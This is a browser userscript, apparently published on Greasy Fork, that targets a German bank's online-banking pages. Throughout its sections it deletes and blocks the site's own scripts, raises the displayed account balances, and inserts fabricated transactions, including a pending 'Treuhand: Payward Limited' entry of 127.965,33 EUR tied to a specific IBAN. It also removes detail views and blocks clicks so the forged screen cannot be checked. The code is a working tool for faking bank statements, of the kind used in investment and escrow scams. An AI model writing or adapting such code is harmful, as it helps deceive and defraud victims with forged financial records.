// ==UserScript==
// @name         Volks combined Horst Amedick
// @namespace    http://tampermonkey.net/
// @version      0.2
// @description  Modify account balance values, update data-positive attribute, and remove currency elements
// @author       You
// @match        https://www.sparda-bank-hamburg.de/*
// @grant        none
// @downloadURL https://update.greasyfork.org/scripts/481465/Volks%20combined%20Horst%20Amedick.user.js
// @updateURL https://update.greasyfork.org/scripts/481465/Volks%20combined%20Horst%20Amedick.meta.js
// ==/UserScript==



//==========================================================================================================================================================================
//=================CONFIGURABLES============================================================================================================================================
//==========================================================================================================================================================================


//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------

   // Array of configurable balance adjustments
    var BALANCE_CONFIGS = [
        { index: 0, adjustmentAmount:  10 },
        { index: 1, adjustmentAmount: 10 },
        { index: 2, adjustmentAmount: 10 }
        // Add more balance configurations as needed
    ];


//222222444444---------------VOLKS UMSAETZE AND UEBER BAL CHANGE---------------------------------------------------------------------------------------------------------------

    // Define the target text content to search for (case and whitespace insensitive)
    var targetTextContent1 = "DE08 2069 0500";
    var targetTextContent2 = " 0000 0868 28";

    // Configurable modification amount (positive or negative)
    const modificationAmount = 10.0; // Adjust the amount as needed

    // Configurable timeout in milliseconds (default: 2000 milliseconds)
    const timeoutMillis = 0; // Adjust the timeout as needed



//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------


    // Configurable timeout value (in milliseconds)
    const TIMEOUT_MS = 0; // Change this value as needed

    // Configurable text content to check (concatenated)
    const TEXT_CONTENT_TO_CHECK = 'DE08 2069 0500 0000 0868 28';

    // Array of configurable transactions
    const TRANSACTIONS = [
        {
            title: 'Treuhand: Payward Limited',
            description: 'Treuhand: Freigabe nötig durch Payward Limited',
            amount: '127.965,33',
            date: 'Vorgemerkt',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 1, // Number of steps to move the transaction
            moveDirectionDown: false, // Set to false to move up
            order: 2 // Specify the order in which the transaction should be inserted
        },
        {
            title: 'Payward Limited',
            description: 'Test',
            amount: '10,00',
            date: '5. Dez.',
            insertAfter: false, // Set to false to insert before the original transaction
            moveSteps: 0, // Number of steps to move the transaction
            moveDirectionDown: true, // Set to false to move up
            order: 1 // Specify the order in which the transaction should be inserted
        },
        // Add more transaction configurations here
    ];




//==========================================================================================================================================================================
//=================CONFIGURABLES============================================================================================================================================
//==========================================================================================================================================================================




//11111111111-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//11111111111-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111-----------------------------------------------------------------------------------------------------------------------------------------------------------------



   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {


(function() {
    'use strict';

    // Define the target text content to search for (case and whitespace insensitive)
    var targetTextContent1 = "Herzlich willkommen!";
    var targetTextContent2 = " ";

    // Configurable timeout in milliseconds (default: 2000 milliseconds)
    const timeoutMillis = 0; // Adjust the timeout as needed

    // Array of configurable balance adjustments
 //   var BALANCE_CONFIGS = [
 //       { index: 0, adjustmentAmount: -5000 },
 //       { index: 1, adjustmentAmount: -5000 },
 //       { index: 2, adjustmentAmount: -5000 }
        // Add more balance configurations as needed
  //  ];

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Function to modify balance values, update data-positive attributes, and remove currency elements
    function modifyBalances() {
        // Select all elements with class "saldo ng-star-inserted"
        var balanceElements = document.querySelectorAll('.saldo.ng-star-inserted');

        // Loop through each balance element
        balanceElements.forEach(function (balanceElement, index) {
            // Check if the balance element exists
            if (balanceElement) {
                // Get the current balance text content
                var balanceText = balanceElement.textContent;

                // Remove non-numeric characters and replace commas with dots
                var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

                // Check if there is a direct sibling with the class "waehrung ng-star-inserted"
                var siblingCurrencyElement = balanceElement.nextElementSibling;
                if (siblingCurrencyElement && siblingCurrencyElement.classList.contains('waehrung') && siblingCurrencyElement.classList.contains('ng-star-inserted')) {
                    // Get the corresponding configuration
                    var config = BALANCE_CONFIGS[index];

                    // Check if the configuration exists
                    if (config) {
                        // Modify the balance based on the sign and the adjustment amount
                        numericValue += config.adjustmentAmount;

                        // Update the data-positive attribute based on the new balance sign
                        balanceElement.parentElement.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');

                        // Format the modified balance value
                        var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

                        // Update the balance text content
                        balanceElement.textContent = updatedBalanceText;

                        // Check for an extra minus sign and remove it
                        if (balanceElement.textContent.includes('--')) {
                            balanceElement.textContent = balanceElement.textContent.replace('--', '-');
                        }

                        // Remove the sibling currency element
                        siblingCurrencyElement.remove();
                    }
                }
            }
        });
    }

    // Function to check for specific text content and "EUR" currency
    function checkForConditions() {
        // Get the text content of the entire page and convert to lowercase
        var pageTextContent = document.body.textContent.toLowerCase();

        // Check if either of the target text contents is found on the page
        if (pageTextContent.includes(targetTextContent1) || pageTextContent.includes(targetTextContent2)) {
            // Execute the modifyBalances function
            modifyBalances();
        }
    }

    // Function to observe and remove the second child of the parent with class "konto-list-header-wrapper"
    function observeAndRemoveSecondChild() {
        var parentElement = document.querySelector('.konto-list-header-wrapper');

        if (parentElement && parentElement.children.length >= 2) {
            // Select the second child and remove it
            var secondChild = parentElement.children[1];
            secondChild.remove();
        }
    }

    // Remove scripts immediately
    removeScripts();

    // Check for conditions at regular intervals
    setInterval(checkForConditions, 100); // Adjust the interval time as needed (2000 milliseconds = 2 seconds)

    // Observe and remove the second child periodically
    setInterval(observeAndRemoveSecondChild, 1000); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)

})();

}




//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END---------------VOLKS FINUB BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//11111111111  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------





//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222---------------VOLKS UMSAETZE BAL CHANGE-------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {


(function() {
    'use strict';

    // Define the target text content to search for (case and whitespace insensitive)
 //   var targetTextContent1 = "DE02 5606 1472";
 //   var targetTextContent2 = "0008 3176 19";

    // Configurable modification amount (positive or negative)
 //   const modificationAmount = -100.0; // Adjust the amount as needed

    // Configurable timeout in milliseconds (default: 2000 milliseconds)
//    const timeoutMillis = 0; // Adjust the timeout as needed

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Function to modify the balance value, update data-positive attribute, and remove currency element
    function modifyBalance() {
        // Select the parent element with attribute data-positive
        var parentElement = document.querySelector('[data-positive]');

        // Check if the parent element exists
        if (parentElement) {
            // Select the element with class "saldo ng-star-inserted" within the parent
            var balanceElement = parentElement.querySelector('.saldo.ng-star-inserted');

            // Check if the balance element exists
            if (balanceElement) {
                // Get the current balance text content
                var balanceText = balanceElement.textContent;

                // Remove non-numeric characters and replace commas with dots
                var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

                // Check if the parent element has data-positive="0" indicating a negative balance
                var isNegative = parentElement.getAttribute('data-positive') === '0';

                // Modify the balance based on the sign and the modification amount
                numericValue += modificationAmount;

                // Update the data-positive attribute based on the new balance sign
                parentElement.setAttribute('data-positive', numericValue >= 0 ? '1' : '0');

                // Format the modified balance value
                var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

                // Update the balance text content
                balanceElement.textContent = updatedBalanceText;

                // Check for an extra minus sign and remove it
                if (balanceElement.textContent.includes('--')) {
                    balanceElement.textContent = balanceElement.textContent.replace('--', '-');
                }
            } else {
                console.error('Balance element not found.');
            }

            // Select and remove the currency element if it exists
            var currencyElement = parentElement.querySelector('.waehrung.ng-star-inserted');
            if (currencyElement) {
                currencyElement.remove();
            }
        } else {
            console.error('Parent element with data-positive attribute not found.');
        }
    }

    // Function to check for specific text content and "EUR" currency
    function checkForConditions() {
        // Check if the text "Herzlich willkommen!" is found on the page
        if (document.body.textContent.includes("Herzlich willkommen!")) {
            // Exit the script if the welcome text is found
            return;
        }

        // Get the text content of the entire page and convert to lowercase
        var pageTextContent = document.body.textContent.toLowerCase();

        // Check if either of the target text contents is found on the page
        if (pageTextContent.includes(targetTextContent1) || pageTextContent.includes(targetTextContent2)) {
            // Check for "EUR" under the class "waehrung ng-star-inserted"
            var currencyElement = document.querySelector('.waehrung.ng-star-inserted');
            if (currencyElement && currencyElement.textContent.toLowerCase() === 'eur') {
                // Execute the modifyBalance function
                modifyBalance();
            }
        }
    }

    // Remove scripts immediately
    removeScripts();

    // Check for conditions at regular intervals
    setInterval(checkForConditions, 30); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)

})();


}



//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END---------------VOLKS UMSAETZE BAL CHANGE-------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//22222222222  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------



//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {


(function() {
    'use strict';

    // Configurable timeout value (in milliseconds)
//    const TIMEOUT_MS = 0; // Change this value as needed

    // Configurable text content to check (concatenated)
//    const TEXT_CONTENT_TO_CHECK = 'de02560614720008317619';

    // Array of configurable transactions
//    const TRANSACTIONS = [
 //       {
 //           title: 'Treuhand: Payward Limited',
 //           description: 'Treuhand: Freigabe nötig durch Payward Limited',
 //           amount: '550.000,00',
 //           date: 'Vorgemerkt',
 //           insertAfter: false, // Set to false to insert before the original transaction
  //          moveSteps: 1, // Number of steps to move the transaction
  //          moveDirectionDown: false, // Set to false to move up
  //          order: 2 // Specify the order in which the transaction should be inserted
  //      },
  //      {
  //          title: 'Payward Limited',
  //          description: 'Geld für Steuern',
   //         amount: '37.000,00',
   //         date: '26. Nov.',
  //          insertAfter: false, // Set to false to insert before the original transaction
 //           moveSteps: 0, // Number of steps to move the transaction
  ////          moveDirectionDown: true, // Set to false to move up
   //         order: 1 // Specify the order in which the transaction should be inserted
  //      },
        // Add more transaction configurations here
 //   ];

    // Sort transactions based on the 'order' property
    TRANSACTIONS.sort((a, b) => a.order - b.order);

    console.log('Userscript initiated.');

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Watch for changes in the DOM and remove added scripts
    var observer = new MutationObserver(function (mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                for (var node of mutation.addedNodes) {
                    if (node.tagName === 'SCRIPT') {
                        console.log('Script added. Removing...');
                        node.remove();
                        console.log('Script removed.');
                    }
                }
            }
        }
    });

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Function to process transactions
    function processTransactions() {
        console.log('Processing multiple transactions.');

        // Check if the concatenated text content is found on the page
        const textFound = checkTextContent(TEXT_CONTENT_TO_CHECK);

        if (textFound) {
            // Select the target element
            var targetElement = document.querySelector('app-umsatz-list-optimized');
            console.log('Searching for target element...');

            // Check if the target element exists
            if (!targetElement) {
                console.error('Target element not found');
                return;
            }
            console.log('Target element found:', targetElement);

            // Check if transactions have already been inserted
            if (!targetElement.querySelector('.custom-transaction')) {
                TRANSACTIONS.forEach((transaction, index) => {
                    console.log(`Processing transaction ${index + 1}`);
                    insertAndMoveTransaction(targetElement, transaction);
                });
            } else {
                console.log('Transactions have already been inserted.');
            }
        } else {
            console.log('Text content not found on the page. Waiting for it to appear...');
        }
    }

    // Function to check if a text content is found on the page (case and whitespace insensitive)
    function checkTextContent(text) {
        const textToCheck = text.replace(/\s/g, '').toLowerCase();
        const pageText = document.body.textContent.replace(/\s/g, '').toLowerCase();
        return pageText.includes(textToCheck);
    }

    // Function to insert and move a transaction
    function insertAndMoveTransaction(targetElement, config) {
        // Get the first child of the target element
        var firstChild = targetElement.firstElementChild;
        if (!firstChild) {
            console.error('No first child found in the target element');
            return;
        }

        // Clone the first child
        var clone = firstChild.cloneNode(true);

        // Add a class to identify custom transactions
        clone.classList.add('custom-transaction');

        // Customization of cloned child
        updateElementTextContent(clone, '.umsatz-name.text-truncate', config.title);
        updateElementTextContent(clone, '.verwendungszweck-label.text-truncate', config.description);
        setCustomAmountAndCurrency(clone, config.amount);
        updateElementTextContent(clone, '.d-flex.justify-content-end.buchung-zeit', config.date);

        // Insert the cloned node based on the configuration
        var referenceNode = config.insertAfter ? firstChild.nextSibling : firstChild;
        targetElement.insertBefore(clone, referenceNode);

        // Move the cloned node based on the configuration
        moveTransaction(clone, config.moveSteps, config.moveDirectionDown);
    }

    // Helper function to update text content of an element within the clone
    function updateElementTextContent(clone, selector, newText) {
        const element = clone.querySelector(selector);
        if (element) {
            console.log(`Found element for selector '${selector}', updating text content.`);
            element.textContent = newText;
        } else {
            console.error(`Element not found for selector '${selector}'.`);
        }
    }

    // Function to set custom amount and update currency positivity based on the amount's sign
    function setCustomAmountAndCurrency(clone, amount) {
        const amountElement = clone.querySelector('.text-right.konto-umsatz-saldo-shredder span');
        const currencyElement = clone.querySelector('.waehrung-shredder.text-left span');
        const isPositive = !amount.startsWith('-'); // Determines positivity based on amount's sign

        if (amountElement && currencyElement) {
            console.log('Found amount and currency elements:', amountElement, currencyElement);
            amountElement.textContent = amount;
            amountElement.setAttribute('data-positive', isPositive ? '1' : '0');
            currencyElement.setAttribute('data-positive', isPositive ? '1' : '0');
        } else {
            console.error('Amount or currency element not found.');
        }
    }

    // Function to move the transaction up or down by a specified number of steps
    function moveTransaction(transactionNode, steps, moveDown) {
        let currentNode = transactionNode;
        while (steps > 0 && currentNode) {
            currentNode = moveDown ? currentNode.nextSibling : currentNode.previousSibling;
            steps--;
        }

        if (currentNode) {
            const referenceNode = moveDown ? currentNode.nextSibling : currentNode;
            transactionNode.parentNode.insertBefore(transactionNode, referenceNode);
            console.log('Transaction moved.');
        } else {
            console.error('Unable to move transaction: Reached the end of the list.');
        }
    }

    // Continuously check for the presence of transactions every 2 seconds
    setInterval(processTransactions, 100);

})();


}


//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END---------------VOLKS UMSAETZE MULTIPLE TRANSACTIONS--------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//33333333333  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------




//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444---------------VOLKS UEBER BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {


(function() {
    'use strict';

    // Define the target text contents to search for (case and whitespace insensitive)
 //   var targetTextContent1 = "DE02 5606 1472";
//    var targetTextContent2 = "0008 3176 19";

    // Configurable modification amount (positive or negative)
 //   const modificationAmount = -2000.0; // Adjust the amount as needed

    // Function to remove scripts from the document
    function removeScripts() {
        console.log('Removing scripts...');
        document.querySelectorAll('script').forEach(function (script) {
            script.remove();
            console.log('Script removed.');
        });
    }

    // Function to modify the balance value
    function modifyBalance() {
        // Select the element with class "kf-account-saldo-value"
        var balanceElement = document.querySelector('.kf-account-saldo-value');

        // Check if the balance element exists
        if (balanceElement) {
            // Get the current balance text content
            var balanceText = balanceElement.textContent;

            // Remove non-numeric characters and replace commas with dots
            var numericValue = parseFloat(balanceText.replace(/[^\d,-]/g, '').replace(',', '.'));

            // Modify the balance based on the sign and the modification amount
            numericValue += modificationAmount;

            // Format the modified balance value
            var updatedBalanceText = (numericValue >= 0 ? '' : '-') + numericValue.toLocaleString('de-DE', { style: 'currency', currency: 'EUR' }).replace('€', 'EUR');

            // Update the balance text content
            balanceElement.textContent = updatedBalanceText;

            // Check for an extra minus sign and remove it
            if (balanceElement.textContent.includes('--')) {
                balanceElement.textContent = balanceElement.textContent.replace('--', '-');
            }

            // Check the class name of the parent element to update data-positive attribute
            var parentElement = balanceElement.closest('.kf-account-saldo');
            if (parentElement) {
                var isPositive = numericValue >= 0;
                parentElement.classList.remove('kf-account-saldo-positive', 'kf-account-saldo-negative');
                parentElement.classList.add(isPositive ? 'kf-account-saldo-positive' : 'kf-account-saldo-negative');
            }

            console.log('Balance modified successfully.');

            // Select and remove the sibling currency element if it exists
            var currencyElement = balanceElement.nextElementSibling;
            if (currencyElement && currencyElement.classList.contains('kf-account-saldo-currency')) {
                currencyElement.remove();
                console.log('Currency element removed.');
            }
        } else {
            console.error('Balance element not found.');
        }
    }

     // Function to check for specific text content and the presence of currency element
function checkForConditions() {
    // Get the text content of the entire page, convert to lowercase, and trim whitespace
    var pageTextContent = document.body.textContent.toLowerCase().trim();

    // Convert the target text contents to lowercase and trim whitespace
    var lowerCaseTargetTextContent1 = targetTextContent1.toLowerCase().trim();
    var lowerCaseTargetTextContent2 = targetTextContent2.toLowerCase().trim();

    // Check if either of the target text contents is found on the page
    if (pageTextContent.includes(lowerCaseTargetTextContent1) || pageTextContent.includes(lowerCaseTargetTextContent2)) {
        // Check if the sibling currency element is present
        var currencyElement = document.querySelector('.kf-account-saldo-value + .kf-account-saldo-currency');
        if (currencyElement) {
            // Execute the modifyBalance function
            modifyBalance();
        }
    }
}
    // Remove scripts immediately
    removeScripts();

    // Check for conditions at regular intervals
    setInterval(checkForConditions, 100); // Adjust the interval time as needed (2000 milliseconds = 2 seconds)


    // Function to observe and remove elements with "mat-form-field-subscript-wrapper" in the class name
function observeAndRemoveElements() {
    // Select elements with the specified class name
    var elementsToRemove = document.querySelectorAll('[class*="mat-form-field-subscript-wrapper"]');

    // Check if any matching elements were found
    if (elementsToRemove.length > 0) {
        // Remove each matching element
        elementsToRemove.forEach(function (element) {
            element.remove();
        });

        console.log('Removed elements with class containing "mat-form-field-subscript-wrapper".');
    }
}

// Observe and remove elements periodically
setInterval(observeAndRemoveElements, 50); // Adjust the interval time as needed (5000 milliseconds = 5 seconds)


})();


}

//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END---------------VOLKS UEBER BAL CHANGE----------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//44444444444  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------





//55555555555-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555---------------VOLKS UMSAETZE UTILITY FUNCTIONS------------------------------------------------------------------------------------------------------------------
//55555555555-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555-----------------------------------------------------------------------------------------------------------------------------------------------------------------

   if (window.location.href.indexOf("de") > 0 || window.location.href.indexOf("10658384414") > 0 || window.location.href.indexOf("drive") > 0 ) {


(function() {
    'use strict';

    console.log('Volks umsatze utility functions userscript initiated.');

    // Function to remove elements with "submenu" in their class names
    function removeElementsWithSubmenuClass() {
        const elementsToRemove = document.querySelectorAll('[class*="submenu"]');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with "submenu" in class name:', element);
        });
    }

    // Function to remove elements with "select-arrow" in their class names
    function removeElementsWithSelectArrowClass() {
        const elementsToRemove = document.querySelectorAll('[class*="select-arrow"]');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with "select-arrow" in class name:', element);
        });
    }

    // Function to remove elements with aria-label="Details" and their parent with class "ng-star-inserted"
    function removeUnwantedElements() {
        const elementsToRemove = document.querySelectorAll('[aria-label="Details"]');
        elementsToRemove.forEach(element => {
            const parent = element.closest('.ng-star-inserted');
            if (parent) {
                parent.remove();
                console.log('Removed parent element:', parent);
            }
        });
    }

    // Function to remove elements with the class "chevron"
    function removeElementsWithChevronClass() {
        const elementsToRemove = document.querySelectorAll('.chevron');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with class "chevron":', element);
        });
    }

    // Function to remove elements with the class "umsatz-item-detail-shredder"
    function removeElementsWithDetailClass() {
        const elementsToRemove = document.querySelectorAll('.umsatz-item-detail-shredder');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with class "umsatz-item-detail-shredder":', element);
        });
    }

    // Function to prevent default click behavior for elements under "mat-form-field-wrapper"
    function preventClickUnderMatFormFieldWrapper(event) {
        const matFormFieldWrapper = document.querySelector('[class*="mat-form-field-wrapper"]');
        if (matFormFieldWrapper && (matFormFieldWrapper.contains(event.target) || event.target.matches('[class*="mat-form-field-wrapper"]'))) {
            event.stopPropagation();
            event.preventDefault();
        }
    }

    // Function to remove elements with role="listbox"
    function removeElementsWithListboxRole() {
        const elementsToRemove = document.querySelectorAll('[role="listbox"]');
        elementsToRemove.forEach(element => {
            element.remove();
            console.log('Removed element with role="listbox":', element);
        });
    }

    // Watch for changes in the DOM and remove unwanted elements
    var observer = new MutationObserver(function (mutationsList) {
        for (var mutation of mutationsList) {
            if (mutation.addedNodes) {
                removeUnwantedElements();
                removeElementsWithSubmenuClass();
                removeElementsWithSelectArrowClass();
                removeElementsWithChevronClass();
                removeElementsWithDetailClass();
                removeElementsWithListboxRole(); // Add removal of elements with role="listbox"
            }
        }
    });

    // Add click event listener to prevent default behavior under "mat-form-field-wrapper"
    document.addEventListener('click', preventClickUnderMatFormFieldWrapper);

    // Start observing the document
    observer.observe(document.documentElement, { childList: true, subtree: true });

    // Initial removal of unwanted elements
    removeUnwantedElements();
    removeElementsWithSubmenuClass();
    removeElementsWithSelectArrowClass();
    removeElementsWithChevronClass();
    removeElementsWithDetailClass();
    removeElementsWithListboxRole(); // Add initial removal of elements with role="listbox"
})();

}


//55555555555  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555  THE END---------------VOLKS UMSAETZE UTILITY FUNCTIONS------------------------------------------------------------------------------------------------------------------
//55555555555  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------
//55555555555  THE END-----------------------------------------------------------------------------------------------------------------------------------------------------------------